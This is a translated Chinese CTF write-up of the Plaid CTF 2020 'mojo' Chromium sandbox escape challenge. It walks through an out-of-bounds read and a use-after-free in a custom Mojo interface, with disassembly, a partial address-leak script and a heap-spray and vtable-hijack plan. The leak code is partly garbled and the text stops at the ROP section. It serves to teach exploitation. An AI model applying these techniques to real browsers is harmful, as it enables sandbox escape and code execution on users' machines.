# Plaid CTF 2020 mojo 复现 - chromium sandbox escape
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
Plaid ctf 2020 的一道 chromium sandbox escape 题目，比较基础，适合入门，
题目文件可以在[这里](https://play.plaidctf.com/files/mojo-837fd2df59f60214ffa666a0b71238b260ffd9114fd612a7f633f4ba1b4da74f.tar.gz)
下载, exp 参考来自[这里](https://trungnguyen1909.github.io/blog/post/PlaidCTF2020/)
## 漏洞分析
题目写了一个`plaidstore.mojom` 文件，定义了`PlaidStore`接口，有`StoreData` 和 `GetData` 两个函数
    --- /dev/null
    +++ b/third_party/blink/public/mojom/plaidstore/plaidstore.mojom
    @@ -0,0 +1,11 @@
    +module blink.mojom;
    +
    +// This interface provides a data store
    +interface PlaidStore {
    +
    +  // Stores data in the data store
    +  StoreData(string key, array data);
    +
    +  // Gets data from the data store
    +  GetData(string key, uint32 count) => (array data);
    +};
可以用下面方式调用到这两个函数
    p = blink.mojom.PlaidStore.getRemote(true);
    p.storeData("aaaa",new Uint8Array(0x10));
    p.getData("aaaa",0x200))
`PlaidStoreImpl` 有两个成员, `render_frame_host_` 保存当前的 `RenderFrameHost` ，
它用来描述网页本身，`data_store_`用来存放数据。
    +class PlaidStoreImpl : public blink::mojom::PlaidStore {
        ...
    + private:
    +  RenderFrameHost* render_frame_host_;
    +  std::map > data_store_;
    +};
`PlaidStoreImpl::StoreData` 存入传入的data，这里data 是 `uint8_t` 类型，`data_store_` 是一个
vector 会自动给对应的key申请内存
    +void PlaidStoreImpl::StoreData(
    +    const std::string &key,
    +    const std::vector &data) {
    +  if (!render_frame_host_->IsRenderFrameLive()) {
    +    return;
    +  }
    +  data_store_[key] = data;
    +}
    +
`PlaidStoreImpl::GetData` 有两个参数，`count`
表示要返回的数量，如果调用`p.getData("aaaa",0x200));`, 这个时候`it`是`key == "aaaa"`
的时候保存的数据，结果会返回index在 `[0,0x200)` 返回的数据， 这里并没有对count做检查，假如执行
`p.storeData("aaaa",new Uint8Array(0x100));p.getData("aaaa",0x200))`,
可以成功返回数据，于是这里就有了一个越界读，可以用来泄露数据。
    +void PlaidStoreImpl::GetData(
    +    const std::string &key,
    +    uint32_t count,
    +    GetDataCallback callback) {
    +  if (!render_frame_host_->IsRenderFrameLive()) {
    +    std::move(callback).Run({});
    +    return;
    +  }
    +  auto it = data_store_.find(key);
    +  if (it == data_store_.end()) {
    +    std::move(callback).Run({});
    +    return;
    +  }
        //[1]
    +  std::vector result(it->second.begin(), it->second.begin() + count);
    +  std::move(callback).Run(result);
    +}
两个函数开头的处都会检查`render_frame_host_->IsRenderFrameLive()`,
但是并没有检查`render_frame_host_` 是否可用，我们可以创建一个`iframe` ，内部执行 `p =
blink.mojom.PlaidStore.getRemote(true);` 并返回给 `parent`,
然后删除这个`iframe`，这个时候`render_frame_host_` 被释放了，但是仍可以调用`p.getData` 和`p.storeData`
于是可以进行堆喷获取到被释放的`render_frame_host_` ,
改写其函数指针，然后在执行`render_frame_host_->IsRenderFrameLive()` 的时候就可以劫持控制流。
## 漏洞利用
通过前面的分析，现在有了地址泄露和uaf，后续的基本利用流程如下
  * 1 泄露出 chrome 的基地址 => 获取gadget
  * 2 添加`iframe`, 返回`render_frame_host_` 的地址和 `p`
  * 3 删除 iframe, 堆喷改写`iframe`的 `render_frame_host_` ，写入gadget 代码执行
接下来一个一个看
###  调试
题目给出了`Dockerfile` 可以直接搞个`Docker` 来调试，这里我在`ubuntu1804`下， 执行`./chrome --disable-gpu --remote-debugging-port=1338 --enable-blink-features=MojoJS,MojoJSTest`
运行`chrome`， 然后`gdb attach` 即可， 因为这里是调试 mojo代码，我们attach browser进程(第一个)
编写 exp, `mojo_js.zip` 解压到`www` 目录下， 这里我的exp 写在`www/poc/e2xp.html` 里面,
包含好对应的`js`，然后启动web服务器就可以访问了
###  泄露 chrome 基地址
`PlaidStore` 对象创建的时候会分配内存, 可以想下面这样找函数的地址
    chrome$ nm --demangle  ./chrome |grep -i 'PlaidStoreImpl::Create'
    0000000003c58490 t content::PlaidStoreImpl::Create(content::RenderFrameHost*, mojo::PendingReceiver)
gdb 下查看 `content::PlaidStoreImpl::Create` 代码如下
    push   rbp
    mov    rbp,rsp
    push   r15
    push   r14
    push   rbx
    sub    rsp,0x38
    mov    r14,rsi
    mov    rbx,rdi
    // PlaidStore 对象分配内存 ==> buffer64
    mov    edi,0x28
    call   0x55555ac584b0 
    // rcx == vtable
    lea    rcx,[rip+0x635e2ec]        # 0x55555f50a7a0 
    // buffer64[0] =  vtable
    mov    QWORD PTR [rax],rcx
    // buffer64[1] =  render_frame_host_
    mov    QWORD PTR [rax+0x8],rbx
    lea    rcx,[rax+0x18]
    xorps  xmm0,xmm0
    movups XMMWORD PTR [rax+0x18],xmm0
所以如果执行
    p.storeData("aaaa",Uint8Array(0x28));
    blink.mojom.PlaidStore.getRemote(true)
那么`Uint8Array` 的backing store 和
PlaidStore对象很有可能会连续分配，多次执行上面代码，只要两者内存连续分配的手，就可以通过`p.getData` 泄露出`vtable` 和
`render_frame_host_` 的地址，通过`vtable` 即可计算出 `chrome` 的基地址。
内存泄露的代码如下
    function show(msg){
        document.body.innerHTML+=msg+"";
    }
    async function main(){
        var stores = [];
        let p = blink.mojom.PlaidStore.getRemote(true); 
        for(let i=0;i, content::RenderFrameHostDelegate*, content::FrameTree*, content::FrameTreeNode*, int, int, bool)
对应的代码如下，`RenderFrameHost` 对象的大小是`0xc28`, 所以只需要喷一堆`0xc28` 大小的 `ArrayBuffer`
就有可能重新拿到被释放的对象
       0x0000555559075a50 :   jmp    0x555559075aca , content::RenderFrameHostDelegate*, content::Fram
    eTree*, content::FrameTreeNode*, int, int, bool)+234>
    // new(0xc28) 
       0x0000555559075a52 :   mov    edi,0xc28
       0x0000555559075a57 :   call   0x55555ac584b0 
       0x0000555559075a5c :   mov    rdi,rax
       0x0000555559075a5f :   mov    rax,QWORD PTR [r14]
       0x0000555559075a62 :   mov    QWORD PTR [rbp-0x38],rax
       0x0000555559075a66 :   mov    QWORD PTR [r14],0x0
       0x0000555559075a6d :   sub    rsp,0x8
       0x0000555559075a71 :   movzx  eax,BYTE PTR [rbp+0x20]
       0x0000555559075a75 :   lea    rdx,[rbp-0x38]
       0x0000555559075a79 :   mov    r14,rdi
       0x0000555559075a7c :   mov    rsi,rbx
       0x0000555559075a7f :   mov    rcx,r13
       0x0000555559075a82 :   mov    r8,r12
       0x0000555559075a85 :   mov    r9,r15
###  rop 代码执行
查看`GetData` 函数的汇编代码